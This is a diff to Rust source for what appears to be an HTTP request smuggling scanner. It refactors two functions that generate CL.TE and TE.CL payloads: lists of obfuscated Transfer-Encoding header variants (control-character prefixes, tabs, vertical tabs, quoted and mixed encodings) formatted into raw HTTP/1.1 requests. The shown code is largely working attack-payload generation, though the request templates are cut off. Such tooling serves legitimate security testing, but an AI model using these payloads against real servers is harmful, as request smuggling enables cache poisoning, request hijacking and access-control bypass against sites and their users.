@@ -26,45 +26,41 @@ pub fn get_cl_te_payloads(
 ) -> Vec<String> {
     let mut te_headers = vec![
         // Basic variations
-        "Transfer-Encoding: chunked",
-        " Transfer-Encoding: chunked",
-        "Transfer-Encoding : chunked",
-        "Transfer-Encoding:\tchunked",
-        "Transfer-Encoding\t: chunked",
-        "Transfer-Encoding\t:\tchunked",
-        "Transfer-Encoding\r\n : chunked",
+        "Transfer-Encoding: chunked".to_string(),
+        " Transfer-Encoding: chunked".to_string(),
+        "Transfer-Encoding : chunked".to_string(),
+        "Transfer-Encoding:\tchunked".to_string(),
+        "Transfer-Encoding\t: chunked".to_string(),
+        "Transfer-Encoding\t:\tchunked".to_string(),
+        "Transfer-Encoding\r\n : chunked".to_string(),
         
         // Additional smuggler-inspired variations
-        "Transfer-Encoding:  chunked",  // Double space after colon
-        "Transfer-Encoding: chunked ",  // Trailing space
-        "Transfer-Encoding: chunked\t",  // Trailing tab
-        "Transfer-Encoding:\x0Bchunked", // Vertical tab
-        "Transfer-Encoding: chunked, identity", // Multiple encodings
-        "Transfer-Encoding: identity, chunked", // Reversed order
-        "Transfer-Encoding:\nchunked",  // Newline after colon
-        "Transfer-Encoding: \"chunked\"", // Quoted value
-        "Transfer-Encoding: 'chunked'", // Single quoted value
+        "Transfer-Encoding:  chunked".to_string(),  // Double space after colon
+        "Transfer-Encoding: chunked ".to_string(),  // Trailing space
+        "Transfer-Encoding: chunked\t".to_string(),  // Trailing tab
+        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab
+        "Transfer-Encoding: chunked, identity".to_string(), // Multiple encodings
+        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order
+        "Transfer-Encoding:\nchunked".to_string(),  // Newline after colon
+        "Transfer-Encoding: \"chunked\"".to_string(), // Quoted value
+        "Transfer-Encoding: 'chunked'".to_string(), // Single quoted value
     ];
     
     // Add whitespace prefix variations with common control characters
     for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
-        te_headers.push(Box::leak(
-            format!("{}Transfer-Encoding: chunked", *ch as char).into_boxed_str()
-        ));
+        te_headers.push(format!("{}Transfer-Encoding: chunked", *ch as char));
     }
     
     // Add whitespace in header name
     for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
-        te_headers.push(Box::leak(
-            format!("Transfer-Encoding{}: chunked", *ch as char).into_boxed_str()
-        ));
+        te_headers.push(format!("Transfer-Encoding{}: chunked", *ch as char));
     }
     
     let mut payloads = Vec::new();
     let custom_header_str = format_custom_headers(custom_headers);
     let cookie_str = format_cookies(cookies);
 
-    for te_header in te_headers {
+    for te_header in &te_headers {
         payloads.push(format!(
             "{} {} HTTP/1.1\r\n\
              Host: {}\r\n\
@@ -93,45 +89,41 @@ pub fn get_te_cl_payloads(
 ) -> Vec<String> {
     let mut te_headers = vec![
         // Basic variations
-        "Transfer-Encoding: chunked",
-        " Transfer-Encoding: chunked",
-        "Transfer-Encoding : chunked",
-        "Transfer-Encoding:\tchunked",
-        "Transfer-Encoding\t: chunked",
-        "Transfer-Encoding\t:\tchunked",
-        "Transfer-Encoding\r\n : chunked",
+        "Transfer-Encoding: chunked".to_string(),
+        " Transfer-Encoding: chunked".to_string(),
+        "Transfer-Encoding : chunked".to_string(),
+        "Transfer-Encoding:\tchunked".to_string(),
+        "Transfer-Encoding\t: chunked".to_string(),
+        "Transfer-Encoding\t:\tchunked".to_string(),
+        "Transfer-Encoding\r\n : chunked".to_string(),
         
         // Additional smuggler-inspired variations
-        "Transfer-Encoding:  chunked",  // Double space after colon
-        "Transfer-Encoding: chunked ",  // Trailing space
-        "Transfer-Encoding: chunked\t",  // Trailing tab
-        "Transfer-Encoding:\x0Bchunked", // Vertical tab
-        "Transfer-Encoding: chunked, identity", // Multiple encodings
-        "Transfer-Encoding: identity, chunked", // Reversed order
-        "Transfer-Encoding:\nchunked",  // Newline after colon
-        "Transfer-Encoding: \"chunked\"", // Quoted value
-        "Transfer-Encoding: 'chunked'", // Single quoted value
+        "Transfer-Encoding:  chunked".to_string(),  // Double space after colon
+        "Transfer-Encoding: chunked ".to_string(),  // Trailing space
+        "Transfer-Encoding: chunked\t".to_string(),  // Trailing tab
+        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab
+        "Transfer-Encoding: chunked, identity".to_string(), // Multiple encodings
+        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order
+        "Transfer-Encoding:\nchunked".to_string(),  // Newline after colon
+        "Transfer-Encoding: \"chunked\"".to_string(), // Quoted value
+        "Transfer-Encoding: 'chunked'".to_string(), // Single quoted value
     ];
     
     // Add whitespace prefix variations with common control characters
     for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
-        te_headers.push(Box::leak(
-            format!("{}Transfer-Encoding: chunked", *ch as char).into_boxed_str()
-        ));
+        te_headers.push(format!("{}Transfer-Encoding: chunked", *ch as char));
     }
     
     // Add whitespace in header name
     for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
-        te_headers.push(Box::leak(
-            format!("Transfer-Encoding{}: chunked", *ch as char).into_boxed_str()
-        ));
+        te_headers.push(format!("Transfer-Encoding{}: chunked", *ch as char));
     }
     
     let mut payloads = Vec::new();
     let custom_header_str = format_custom_headers(custom_headers);
     let cookie_str = format_cookies(cookies);
 
-    for te_header in te_headers {
+    for te_header in &te_headers {
         payloads.push(format!(
             "{} {} HTTP/1.1\r\n\
              Host: {}\r\n\
